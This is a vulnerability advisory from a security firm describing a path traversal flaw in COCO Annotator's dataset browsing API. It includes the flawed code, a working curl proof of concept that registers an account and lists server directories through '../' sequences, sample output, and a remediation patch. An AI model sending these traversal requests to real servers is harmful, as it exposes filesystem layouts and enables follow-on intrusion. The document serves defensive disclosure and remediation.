<div align="center">
  <a href="https://www.thoropass.com/" target="_blank" rel="noopener noreferrer">
    <img src="https://github.com/user-attachments/assets/b3bbec80-2537-4578-889e-18eaad0d1194" width="150" alt="Thoropass Logo">
  </a>
  <br><br>
  <a href="https://www.thoropass.com/talk-to-an-expert" target="_blank" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/🌐_WEBSITE-THOROPASS-0078D4?style=for-the-badge" alt="Website">
  </a>
  <a href="https://www.linkedin.com/company/thoropass/" target="_blank" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/LINKEDIN-CONNECT-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn">
  </a>

  <h1>Security Advisory: Path Traversal in COCO Annotator</h1>

  <p>🔐 <strong>Thoropass Vulnerability Research Program</strong> 🧪</p>
</div>

<div align="center">
  <img src="https://img.shields.io/badge/SEVERITY-HIGH_8.6-FF4444?style=for-the-badge" alt="Severity: High">
  <img src="https://img.shields.io/badge/CWE-22-FFA500?style=for-the-badge" alt="CWE-22">
  <img src="https://img.shields.io/badge/STATUS-DISCLOSED-7ED957?style=for-the-badge" alt="Status: Disclosed">
  <img src="https://img.shields.io/badge/TYPE-PATH_TRAVERSAL-9B59B6?style=for-the-badge" alt="Type: Path Traversal">
</div>

---

## 📋 Advisory Information

| Field | Detail |
|:---|:---|
| **Advisory Title** | Path Traversal via Dataset Folder Parameter |
| **Product** | [COCO Annotator](https://github.com/jsbroks/coco-annotator) |
| **Affected Version** | All versions up to and including latest (`master` branch, commit `c3405b6`) |
| **Component** | `backend/webserver/api/datasets.py` — `DatasetDataId` endpoint |
| **Vulnerability Type** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') |
| **CVSS v3.1 Score** | **8.6 (High)** |
| **CVSS v3.1 Vector** | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` |
| **Discovery Date** | 2026-04-09 |
| **Disclosure Date** | 2026-04-09 |
| **Researcher** | Thoropass Penetration Testing Team |
| **CVE ID** | *Pending assignment* |

---

## 🔍 Vulnerability Summary

A **path traversal vulnerability** exists in the COCO Annotator dataset browsing API. The `GET /api/dataset/<id>/data` endpoint accepts a `folder` query parameter that is concatenated into a filesystem path **without proper sanitization or containment validation**.

An authenticated attacker can supply directory traversal sequences (`../`) in the `folder` parameter to escape the intended dataset directory and **enumerate the entire server filesystem**, including sensitive system directories such as `/etc/`, `/root/`, `/proc/`, and `/var/`.

The vulnerability is trivially exploitable by **any authenticated user**, including newly self-registered accounts when open registration is enabled (default configuration).

---

## 🧬 Technical Analysis

### Vulnerable Code

**File:** `backend/webserver/api/datasets.py`, lines **368–377** and **462–477**

```python
# Lines 368-375: Insufficient input sanitization
if len(folder) > 0:
    folder = folder[0].strip('/') + folder[1:]   # ← Only strips '/' from FIRST char
    if folder[-1] != '/':
        folder = folder + '/'

# Line 375: Unsanitized path concatenation
directory = os.path.join(dataset.directory, folder)

# Lines 462-463: Directory listing returned to user
subdirectories = [f for f in sorted(os.listdir(directory))
                  if os.path.isdir(directory + f) and not f.startswith('.')]

# Lines 467-478: Full path and listing exposed in JSON response
return {
    "directory": directory,          # ← Leaks resolved server path
    "subdirectories": subdirectories # ← Leaks filesystem contents
}
```

### Root Cause

The sanitization logic on **line 370** is fundamentally flawed. It only strips the `'/'` character from the **first character** of the `folder` string, leaving `../` traversal sequences completely intact:

```
Input:   folder = "../../../etc/"
After:   folder = ".../../../etc/"   →  still contains traversal
Result:  /datasets/my-dataset/../../../etc/  →  resolves to /etc/
```

The resulting path is passed directly to `os.listdir()` without verifying it resides within the expected dataset directory boundary. The full directory listing and the resolved path string are both returned in the JSON response body.

### Attack Flow

```
                                    ┌──────────────────────┐
                                    │     Attacker          │
                                    │  (Authenticated User) │
                                    └──────────┬───────────┘
                                               │
                           GET /api/dataset/1/data?folder=../../../etc/
                                               │
                                               ▼
                                    ┌──────────────────────┐
                                    │   Flask API Server    │
                                    │   datasets.py:375     │
                                    └──────────┬───────────┘
                                               │
                        os.path.join("/datasets/my-dataset/", "../../../etc/")
                                               │
                                               ▼
                                    ┌──────────────────────┐
                                    │   OS Filesystem       │
                                    │   Resolves to /etc/   │
                                    └──────────┬───────────┘
                                               │
                                  os.listdir("/etc/") → [ssh, ssl, mysql, ...]
                                               │
                                               ▼
                                    ┌──────────────────────┐
                                    │   JSON Response       │
                                    │   200 OK              │
                                    │   { "subdirectories": │
                                    │     ["ssh","ssl",...]} │
                                    └──────────────────────┘
```

---

## 💥 Impact

| Impact Category | Description |
|:---|:---|
| **Confidentiality** | **HIGH** — Full container filesystem structure is exposed. Directory names reveal installed software, system configuration layout, database locations, user accounts, and deployment architecture. |
| **Scope** | **Changed** — The vulnerability allows escaping the dataset directory boundary, affecting resources outside the vulnerable component's intended access scope. |
| **Privilege Required** | **Low** — Any authenticated user can exploit this. When `ALLOW_REGISTRATION` is enabled (default), an attacker can self-register. |
| **Exploitation Complexity** | **Trivial** — Single HTTP GET request with `../` in a query parameter. No special tooling required. |

### Specific Risks

- **Reconnaissance for chained attacks** — Filesystem enumeration reveals exact OS version, installed packages (Python, MySQL, ImageMagick, OpenSSH), and application layout, enabling targeted exploitation of known CVEs in those components.
- **Sensitive directory discovery** — Directories like `/etc/mysql/`, `/etc/ssh/`, `/etc/ssl/`, and `/root/` are exposed, indicating the presence of credentials and cryptographic material.
- **Container escape preparation** — Mapping `/proc/`, `/sys/`, and mount points assists in identifying container escape vectors.
- **Multi-tenant data leakage** — In shared deployments, attackers can discover other users' dataset directories and internal application paths.

---

## 🧪 Proof of Concept

### Prerequisites

- A running COCO Annotator instance (any version)
- A valid user account (self-registration is enabled by default)
- Python 3 with the `requests` library

### Minimal Reproduction (cURL)

> **Note:** The traversal request must use a dataset ID that belongs to the
> authenticated user. The endpoint filters datasets by ownership
> (`current_user.datasets`), so using another user's dataset ID will return
> an error. Create your own dataset first and use the returned `id` value.

```bash
# Step 1: Register a user and save session cookie
curl -s -X POST http://TARGET:5001/api/user/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"P@ssw0rd!"}' \
  -c cookies.txt

# Step 2: Create a dataset owned by the attacker (note the returned "id")
curl -s -X POST http://TARGET:5001/api/dataset/ \
  -H "Content-Type: application/json" \
  -d '{"name":"exploit","categories":[]}' \
  -b cookies.txt
# → Response: {"id": 18, "name": "exploit", ...}

# Step 3: Traverse to container root using YOUR dataset ID (e.g. 18)
curl -s "http://TARGET:5001/api/dataset/18/data?folder=../../../" \
  -b cookies.txt | python3 -m json.tool
```

### Expected Output (Vulnerable)

```json
{
  "directory": "/datasets/exploit/../../../",
  "subdirectories": [
    "bin", "boot", "datasets", "dev", "etc", "home",
    "lib", "lib64", "media", "mnt", "models", "opt",
    "proc", "root", "run", "sbin", "srv", "sys",
    "tmp", "usr", "var", "workspace"
  ]
}
```

### Automated PoC Script

A full automated exploit script is available at [`poc_path_traversal.py`](./poc_path_traversal.py):

```bash
python3 poc_path_traversal.py --target http://TARGET:5001
python3 poc_path_traversal.py --target http://TARGET:5001 --traverse /etc/mysql/ /root/ /var/log/
```

The script handles authentication, dataset creation, and escalating traversal with color-coded output highlighting sensitive directories.

---

## ✅ Remediation

### Recommended Fix

Replace the vulnerable path construction logic in `backend/webserver/api/datasets.py` (lines 368–377) with proper path canonicalization and containment validation:

```python
# BEFORE (vulnerable) ❌
if len(folder) > 0:
    folder = folder[0].strip('/') + folder[1:]
    if folder[-1] != '/':
        folder = folder + '/'
directory = os.path.join(dataset.directory, folder)

# AFTER (secure) ✅
import os

# Resolve the dataset root to an absolute canonical path
dataset_root = os.path.realpath(dataset.directory)

# Construct and canonicalize the requested path
directory = os.path.realpath(os.path.join(dataset_root, folder))

# Containment check: ensure resolved path is within dataset boundary
if not directory.startswith(dataset_root + os.sep) and directory != dataset_root:
    return {'message': 'Invalid folder path'}, 400

# Verify the directory exists
if not os.path.isdir(directory):
    return {'message': 'Directory does not exist'}, 400
```

### Defense-in-Depth Recommendations

| Layer | Recommendation |
|:---|:---|
| **Input Validation** | Reject `folder` values containing `..`, null bytes, or non-printable characters at the request parser level. |
| **Path Canonicalization** | Always use `os.path.realpath()` before any filesystem operation to resolve symlinks and traversal sequences. |
| **Containment Check** | After canonicalization, verify the resolved path starts with the expected root directory using string prefix comparison. |
| **Response Hardening** | Remove the `"directory"` field from the API response body to avoid leaking internal server paths. |
| **Least Privilege** | Run the application container with a read-only filesystem where possible, and restrict the application process to its data directory using OS-level controls (e.g., `chroot`, AppArmor, seccomp). |

---

## 📚 References

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [OWASP Testing Guide: Path Traversal (WSTG-ATHZ-01)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include)
- [Python os.path.realpath() Documentation](https://docs.python.org/3/library/os.path.html#os.path.realpath)

---

## 🤝 Disclosure Timeline

| Date | Event |
|:---|:---|
| **2026-04-09** | Vulnerability discovered during security assessment |
| **2026-04-09** | Proof of concept developed and validated |
| **2026-04-09** | Advisory drafted |
| **TBD** | Vendor notification |
| **TBD** | Vendor acknowledgment |
| **TBD** | Fix released |
| **TBD** | CVE assigned |
| **TBD** | Public disclosure |

---

## ⚠️ Disclaimer

This advisory is published for **defensive and educational purposes only**. The vulnerability was identified through authorized security testing. The proof of concept is provided to help defenders validate their exposure and verify remediation.

Thoropass follows **coordinated vulnerability disclosure (CVD)** principles. Vulnerabilities are reported privately to maintainers, reasonable time is provided for remediation, and public advisories are released after coordination or fix availability.

---

<div align="center">
  <br>

  **Thoropass Vulnerability Research Program**

  <em>Improving ecosystem security through responsible research and disclosure.</em>

  <br><br>
  <a href="https://thoropass.com/contact" target="_blank" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/🔒_Request_a_Penetration_Test-Get_Started-7ED957?style=for-the-badge" alt="Request Pentest">
  </a>
  <br><br>
  <a href="https://www.thoropass.com/platform/penetration-testing" target="_blank" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/🌐_WEBSITE-THOROPASS-0078D4?style=for-the-badge" alt="Website">
  </a>
  <a href="https://www.linkedin.com/company/thoropass/" target="_blank" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/LINKEDIN-CONNECT-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn">
  </a>
</div>

---

<div align="center">
  <br><br>
  <a href="https://www.thoropass.com/talk-to-an-expert" target="_blank" rel="noopener noreferrer">
    <img width="100%" alt="Thoropass" src="https://github.com/user-attachments/assets/557c3c6e-bc2d-4b0e-90cb-503767a0aa23">
  </a>
</div>
